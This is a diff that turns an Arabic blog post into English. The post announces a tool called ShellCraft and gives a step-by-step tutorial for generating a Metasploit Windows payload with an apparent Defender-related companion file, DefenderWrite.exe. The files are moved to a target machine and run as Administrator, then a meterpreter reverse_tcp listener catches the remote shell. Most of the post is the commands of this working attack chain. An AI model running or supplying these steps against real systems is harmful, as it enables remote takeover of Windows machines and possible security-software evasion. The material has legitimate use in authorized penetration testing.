@@ -1,141 +1,152 @@
-أهلاً بكم في أول تدوينة تقنية لفريق HackScale.
+Welcome to the first technical blog post from the HackScale team.
 
-يسعدنا اليوم الإعلان عن إطلاق أداتنا الجديدة ShellCraft، وهي أداة صُممت لتسهيل عمل الباحثين الأمنيين ومختصي اختبار الاختراق عند التعامل مع Shellcodes وإنشاء Payloads بطريقة سريعة ومنظمة.
+Today, we are excited to announce the release of our new tool, ShellCraft, a tool designed to simplify the work of security researchers and penetration testers when dealing with Shellcodes and generating Payloads in a fast and organized way.
 
-في هذه التدوينة سنتعرف على كيفية تثبيت الأداة واستخدامها لإنشاء Metasploit payload والحصول على Meterpreter session على نظام ويندوز.
+In this post, we will learn how to install the tool and use it to generate a Metasploit payload and obtain a Meterpreter session on a Windows system.
 
-لنبدأ.
+Let’s begin.
 
-# استنساخ المستودع
+# Cloning the Repository
 
-أولاً نقوم بنسخ رابط الأداة من المستودع: على GitHub.
+First, we copy the tool repository link from GitHub.
 
 ![clone](/assets/1.png)
 
-ثم نقوم بتحميلها إلى النظام باستخدام الأمر التالي:
+Then, we download it to the system using the following command:
 
-```
+```bash
 git clone https://github.com/HackScaleTeam/ShellCraft
 ```
- ![install](/assets/2.png)
 
+![install](/assets/2.png)
 
-# الدخول إلى مجلد الأداة
+# Entering the Tool Directory
 
-بعد اكتمال التحميل ندخل إلى مجلد الأداة:
-```
+After the download is complete, enter the tool directory:
+
+```bash
 cd ShellCraft
 ```
+
 ![cd](/assets/3.png)
 
-ولعرض الملفات الموجودة داخل المجلد نستخدم الأمر:
-```
+To display the files inside the directory:
+
+```bash
 ls
 ```
 
+## Installing the Tool Requirements
 
-## تثبيت متطلبات الأداة
+Make the installation script executable using the following command:
 
-نقوم بجعل سكربت التثبيت قابلًا للتنفيذ باستخدام الأمر:
-```
+```bash
 chmod +x install.sh
 ```
 
-ثم نقوم بتشغيله لتثبيت جميع متطلبات الأداة:
-```
+Then, run it to install all required dependencies:
+
+```bash
 sudo ./install.sh
 ```
+
 ![chmod](/assets/4.png)
 
+# Creating a Payload Using ShellCraft
 
-# إنشاء Payload باستخدام ShellCraft
+After the installation is complete, run the tool and generate a Metasploit payload using the following command:
 
-بعد اكتمال التثبيت يمكننا تشغيل الأداة وإنشاء Metasploit payload باستخدام الأمر التالي:
-```
+```bash
 python3 shellcraft.py --msf 172.16.166.130 4444 -o payload.exe
 ```
-قم بتغيير IP إلى عنوان جهازك، واختر المنفذ (Port) الذي تريده.
 
-الخيار -o يعني تحديد اسم ملف الإخراج، وفي هذا المثال اخترنا الاسم payload.exe، ويمكنك اختيار أي اسم تريده.
+Replace the IP address with your machine’s address and choose the port you want.
+
+The `-o` option specifies the output file name. In this example, we used the name `payload.exe`, but you can choose any name you want.
 
 ![exam](/assets/7.png)
 
+# Generated Files
 
-# الملفات التي سيتم إنشاؤها
+After executing the previous command, the tool will generate three files:
 
-بعد تنفيذ الأمر السابق ستقوم الأداة بإنشاء ثلاثة ملفات:
-```
+```bash
 payload.exe
 payload.dll
 DefenderWrite.exe
 ```
+
 ![3](/assets/8.png)
 
-بعد ذلك نقوم بنقل هذه الملفات إلى نظام ويندوز المستهدف.
+After that, transfer these files to the target Windows system.
+
 ![exm](/assets/9.png)
 
+# Starting a Listener in Metasploit
 
+Before running the files on the target system, start a listener in Metasploit.
 
-# تشغيل Listener في Metasploit
+Start Metasploit using:
 
-قبل تشغيل الملفات على النظام المستهدف، يجب تشغيل listener في Metasploit.
-
-نبدأ بتشغيل Metasploit :
-```
+```bash
 msfconsole
 ```
+
 ![msf](/assets/10.png)
 
- ومن ثم تشغيل الامر التالي :
-```
+Then, run the following command:
+
+```bash
 use exploit/multi/handler
 ```
 
+Next, specify the payload type:
 
-ثم نحدد نوع الـ payload:
-```
+```bash
 set payload windows/meterpreter/reverse_tcp
 ```
 
+After that, configure your IP address and port:
 
-بعد ذلك نقوم بتحديد عنوان IP والمنفذ الخاصين بنا:
-```
+```bash
 set LHOST 172.16.166.130
 set LPORT 4444
 ```
+
 ![msd](/assets/11.png)
 
-## تشغيل الـ Payload على النظام المستهدف
+## Running the Payload on the Target System
 
-ننتقل الآن إلى نظام ويندوز ونقوم بتشغيل الملف:
-```
+Now move to the Windows system and run the following file:
+
+```bash
 payload.exe
 ```
-كـ مسؤول (Run as Administrator).
 
-⚠️ تأكد من أن الملفات الثلاثة موجودة في نفس المجلد.
+Run it as Administrator (Run as Administrator).
+
+⚠️ Make sure that all three files are located in the same folder.
 
 ![win](/assets/12.png)
 
+# Obtaining a Meterpreter Session
 
-# الحصول على Meterpreter Session
+After running the file on the target system, return to Metasploit.
 
-بعد تشغيل الملف على النظام المستهدف، نعود إلى Metasploit.
-
-كما نرى في الصورة التالية، تم الحصول على Reverse Connection بنجاح وفتح Meterpreter session.
+As shown in the following image, the Reverse Connection was successfully established and a Meterpreter session was opened.
 
 ![r](/assets/13.png)
 
-نشغل الامر sysinfo لمعرفة تفاصيل النظام :
+Run the `sysinfo` command to view system details:
+
 ![e](/assets/14.png)
 
+# Conclusion
 
-# الخاتمة
+In this post, we demonstrated how to use the ShellCraft tool to generate a Metasploit payload and obtain a Meterpreter session in a simple and fast way.
 
-بهذا نكون قد استعرضنا طريقة استخدام أداة ShellCraft لإنشاء Metasploit payload والحصول على Meterpreter session بطريقة بسيطة وسريعة.
+This tool is still under development, and we are continuously working on improving it and adding new features that help security researchers and penetration testers in their daily work.
 
-هذه الأداة ما زالت في مرحلة التطوير، ونعمل باستمرار على تحسينها وإضافة ميزات جديدة تساعد الباحثين الأمنيين ومختصي اختبار الاختراق في عملهم اليومي.
+If you have any suggestions or feedback, feel free to share them with us on GitHub.
 
-إذا كان لديك أي اقتراحات أو ملاحظات فلا تتردد في مشاركتها معنا عبر GitHub.
-
-ترقبوا المزيد من الأدوات والشروحات التقنية القادمة من فريق HackScale.
+Stay tuned for more upcoming tools and technical tutorials from the HackScale team.
